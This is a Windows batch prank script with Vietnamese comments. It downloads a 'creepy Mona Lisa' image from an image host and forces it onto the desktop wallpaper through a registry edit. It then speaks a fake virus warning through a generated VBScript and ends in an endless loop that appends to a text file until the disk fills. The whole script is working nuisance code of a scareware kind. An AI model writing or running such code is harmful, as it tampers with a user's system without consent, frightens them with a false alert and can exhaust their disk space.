@echo off
set URL=https://i.postimg.cc/434Qh1BD/monalisacreppy.jpg
set FILE=%TEMP%\wallpaper.jpg

:: Tải file
curl -o "%FILE%" "%URL%"

:: Đặt làm hình nền
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%FILE%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
timeout 3
echo Set Sapi = CreateObject("SAPI.SpVoice") > temp.vbs
echo Sapi.Speak "Warning , on 2025 have a bug to have a virus . The virus have the mona lisa creppy on your wallpaper . If you see it delete it " >> temp.vbs
cscript //nologo temp.vbs
del temp.vbs
:loop
echo NOTHING BEATS THE SCARE >> NOTHING BEAT THE SCARE.txt
goto loop



